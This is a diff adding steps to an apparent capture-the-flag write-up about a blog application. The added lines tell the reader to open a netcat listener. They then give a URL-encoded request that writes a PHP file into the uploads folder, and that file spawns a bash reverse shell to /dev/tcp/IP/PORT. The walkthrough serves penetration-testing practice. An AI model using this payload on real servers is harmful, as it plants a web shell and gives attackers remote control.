@@ -178,3 +178,12 @@ Oulalala, if we check top right corner, now we are PRO USER and we can upload im
 Upload a few images, add text and now using the text add function on the blog editor turn on Burpy suite and intercept again;
 Now send to repeater and modify it this way:
 
+![image](https://github.com/st1llz0r/Format/assets/142597099/4d8b101a-ec2c-42e7-91ce-63cdee8ffe58)
+
+Before hitting send open NC set it to desired port;
+
+```php
+
+id=/var/www/microblog/blog_name/uploads/rev.php&txt=<%3fphp+exec("/bin/bash+-c+'bash+-i+>%26+/dev/tcp/IP/PORT+0>%261'")%3b%3f>
+
+```
